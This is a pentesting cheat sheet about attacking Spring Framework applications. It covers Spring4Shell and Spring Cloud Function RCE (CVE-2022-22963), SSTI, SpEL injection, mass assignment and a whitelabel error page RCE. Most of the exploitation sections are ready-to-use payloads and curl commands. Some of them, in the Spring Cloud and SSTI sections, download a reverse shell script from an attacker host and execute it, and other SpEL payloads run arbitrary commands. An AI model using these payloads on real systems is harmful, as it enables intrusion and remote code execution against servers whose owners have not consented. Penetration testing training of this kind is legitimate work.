# Spring Framework

## Theory

Spring is an application framework and inversion of control container for the Java platform.

## Practice

{% tabs %}
{% tab title="Fingerprinting" %}
We can attempt to trigger an error on the website as a method of fingerprinting. If the error results in a "**Whitelabel Error Page**," this indicates that the website is running Spring Boot.

```bash
$ curl http://target.com/DoesNotExist
{"timestamp":"2023-09-03T18:49:24.100+00:00","status":404,"error":"Not Found","path":"/DoesNotExist"}
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

### Tools

{% tabs %}
{% tab title="spring4shell-scan" %}
[spring4shell-scan](https://github.com/fullhunt/spring4shell-scan) is a fully automated, reliable, and accurate scanner for finding Spring4Shell and Spring Cloud RCE vulnerabilities

```bash
./spring4shell-scan.py -u http://<target> --test-CVE-2022-22963
```
{% endtab %}
{% endtabs %}

### Routing Abuse

Routing misconfigurations in the Spring Framework can pose significant security risks, potentially leading to protected URL bypass, path traversal, or information leaks.&#x20;

{% content-ref url="spring-routing-abuse.md" %}
[spring-routing-abuse.md](spring-routing-abuse.md)
{% endcontent-ref %}

### Spring Boot Actuators

The Spring Boot Framework includes a number of features called actuators to help you monitor and manage your web application when you push it to production. Intended to be used for auditing, health, and metrics gathering, they can also open a hidden door to your server when misconfigured.

{% content-ref url="spring-boot-actuators.md" %}
[spring-boot-actuators.md](spring-boot-actuators.md)
{% endcontent-ref %}

### Spring View Manipulation

Spring application that uses Thymeleaf as its templating engine, if template name or fragment is concatenated with untrusted data, it can lead to expression language injection and hence RCE.

{% content-ref url="spring-view-manipulation.md" %}
[spring-view-manipulation.md](spring-view-manipulation.md)
{% endcontent-ref %}

### Vulnerabilities

#### Spring4Shell - CVE-2022-22965

{% tabs %}
{% tab title="Exploit" %}
Spring4Shell is a vulnerabilitiy to remote code execution in the Spring Framework. It affects a component in Spring Core which is the heart of the framework.

{% hint style="info" %}
Current conditions for vulnerability (as stated in [Spring's announcement of the vulnerability](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)) can be summarised as follows:

* JDK 9+
* A vulnerable version of the Spring Framework (<5.2 | 5.2.0-19 | 5.3.0-17)
* Apache Tomcat as a server for the Spring application, packaged as a WAR
* A dependency on the `spring-webmvc` and/or `spring-webflux` components of the Spring Framework
{% endhint %}

We may use [BobTheShoplifter's exploit](https://github.com/BobTheShoplifter/Spring4Shell-POC)

```bash
$ python poc.py --url https://example.io/
Shell Uploaded Successfully!
Your shell can be found at: http://MACHINE_IP/tomcatwar.jsp?pwd=thm&cmd=whoami
```

Alternatively, we may use [me2nuk's exploit](https://github.com/me2nuk/CVE-2022-22965)

```bash
$ python3 exploit.py --url="https://TARGET:PORT/ENDPOINT" --dir="webapps/ROOT" --file="cmd"
$ curl https://TARGET:PORT/ENDPOINT/cmd.jsp?cmd=id
```

Alternatively, we may use [Leovalcante's exploit](https://github.com/Leovalcante/spring4shell)

```bash
$ ./spring4shell.py https://TARGET:PORT/ENDPOINT
```
{% endtab %}
{% endtabs %}

#### Spring Cloud RCE - CVE-2022-22963

{% tabs %}
{% tab title="Exploit" %}
In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.

We can easily exploit it by hand

```bash
# 1. upload a rev.sh from our webserver
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget -O /tmp/rev.sh http://<ATTACKING_IP>/rev.sh")' --data-raw 'data' -v

# 2. Execute it
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/rev.sh")' --data-raw 'data' -v
```
{% endtab %}
{% endtabs %}

#### SSTI to RCE

{% tabs %}
{% tab title="Enumerate" %}
If there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the **server-side template injection**.

Try them:

```python
2*2
#{2*2}
*{2*2}
```

Then you can also check more about that.

```python
{"dfd".replace("d", "x")}
#{"dfd".replace("d", "x")}
*{"dfd".replace("d", "x")}

// ---------------------------------------

// the desired output of the above...
"xfx"
```
{% endtab %}

{% tab title="Exploit" %}
If there is an input vulnerable to SSTI,we may gain a reverse shell as follow.

First generate the reverse shell, and host it on your webserver. Then we can send following payloads in the vulnerable input.

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://<local-ip>:8000/rev.sh")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./rev.sh")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./rev.sh")}
```
{% endtab %}
{% endtabs %}

#### Mass Assignment

{% tabs %}
{% tab title="Exploit" %}
Software frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm.

This functionality becomes exploitable when:

* Attacker can guess common sensitive fields.
* Attacker has access to source code and can review the models for sensitive fields.
* AND the object with sensitive fields has an empty constructor.

Suppose there is a form for editing a user's account information:

```html
<form>
     <input name="userId" type="text">
     <input name="password" type="text">
     <input name="email" text="text">
     <input type="submit">
</form>
```

Here is the object that the form is binding to:

```java
@Data
public class User {
   private String userid;
   private String password;
   private String email;
   private boolean isAdmin;
}
```

Here is the controller handling the request:

```java
@RequestMapping(value = "/addUser", method = RequestMethod.POST)
public String submit(User user) {
   userService.add(user);
   return "successPage";
}
```

Using the mass assignment vulnerability, we can set the value of the attribute isAdmin of the instance of the class User:

```bash
curl -X POST -d 'userid=attacker&password=s3cret_pass&email=attacker@attacker-website.com&isAdmin=True' http://<TARGET>/addUser
```
{% endtab %}
{% endtabs %}

#### SpEL Injection

The [Spring Expression Language](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html) (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. SpEL injection occurs when user controlled data is passed directly to the SpEL expression parser.

{% tabs %}
{% tab title="Exploit" %}
&#x20;For instance, the following method uses the standard context to evaluate SpEL expression:

```java
private static final SpelExpressionParser PARSER = new SpelExpressionParser();
private static final StandardEvaluationContext CONTEXT = new StandardEvaluationContext();

@PostMapping(path = "/")
public void method(@RequestBody String path, @RequestBody String value) {
    Expression expression = PARSER.parseExpression(path);
    expression.setValue(CONTEXT, value);
    // ...
}
```

As a result, you can gain code execution by sending the following `POST` request:

```bash
curl -X POST -H 'Content-Type: application/json' -d "{\"path\":\"T(java.lang.Runtime).getRuntime().exec('touch executed').x\", \"value\":\"executed\"}"
```

If you have access to a source code, try to search for vulnerable code using the following keywords:

* `SpelExpressionParser`, `EvaluationContext`, `parseExpression`, `@Value("#{ <expression string> }")`
* `#{ <expression string> }`, `${<property>}`, `T(<javaclass>)`

If a source code is not available, it is worth checking the `metrics` and `beans` endpoints provided by the [Spring Boot actuators](spring-boot-actuators.md). These endpoints can expand the list of available beans and the parameters they accept.
{% endtab %}

{% tab title="Fuzzing" %}
&#x20;Yoy may try to use expressions in different elements of the service:

Parameter names and values:

* `variable[<expression string>]=123`
* `variable=123&<expression string>=123`
* `{"<expression string>":"123"}`
* `{"variable":"<expression string>"}`

HTTP headers:

* `Cookie: cookie_name=<expression string>`
* `Cookie: <expression string>=cookie_value`
* `Private-Token: <expression string>`

You can use the following payloads as the expression string:

```java
${1+3}
T(java.lang.Runtime).getRuntime().exec("dig <URL>")
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('dig <URL>')
new java.lang.ProcessBuilder({'dig <URL>'}).start()
${user.name}
```
{% endtab %}
{% endtabs %}

#### Spring boot whitelabel error page RCE

{% tabs %}
{% tab title="Exploit" %}
This vulnerability requires the following conditions:

* Spring Boot version `1.1.0 - 1.1.12`, `1.2.0 - 1.2.7`, `1.3.0`
* There is at least one interface that triggers the default whitelabel error page in Spring Boot

Check the next Spring Boot application: [LandGrey/springboot-spel-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce). If you send a request to `/article?id=hop`, the application will return a whitelabel error with code `500`. However, if you send a request to `/article?id=${7*7}`, the application returns an error page with the calculated value `49`.&#x20;

As a result, it leads to RCE and you can execute arbitrary commands first by preparing the payload with the next python scrypt (this sample prepares a payload that executes `open -a Calculator` command):

```python
cmd = 'open -a Calculator'

h = ''
for x in cmd:
    h += hex(ord(x)) + ','

payload = h.rstrip(',')

print('${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{' + payload + '}))}')
```

Send the payload within the `id` parameter, `open -a Calculator` will be executed:&#x20;

```bash
curl 'http://<TARGET>/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}'
```
{% endtab %}
{% endtabs %}

#### SimpleEvaluationContext ReDoS

{% tabs %}
{% tab title="Exploit" %}
The `SimpleEvaluationContext` context prevents arbitrary code executing and writes a error message. However, you still can exploit the ReDoS attack.

```java
EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding ().build();
Expression exp = parser.parseExpression("'aaaaaaaaaaaaaaaaaaaaaaaa!'.matches('^(a+)+$')");
// ReDoS
exp.getValue(simpleContext);
```
{% endtab %}
{% endtabs %}

#### Spring Data Redis Insecure Deserialization

Spring Data Redis, part of the larger Spring Data family, provides easy configuration and access to Redis from Spring applications. Spring Data Redis first serializes data before writing data to Redis. By default, Java native serialization is used for serialization.

{% tabs %}
{% tab title="Exploit" %}
When Spring Data Redis retrieves data from Redis, the stored bytecode is deserialized. Since the target class is not checked or filtered during deserialization it can lead to remote code execution.

Read [this article](https://xz.aliyun.com/t/2339) for more details
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://github.com/LandGrey/SpringBootVulExploit" %}

{% embed url="https://tryhackme.com/room/spring4shell" %}

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators" %}
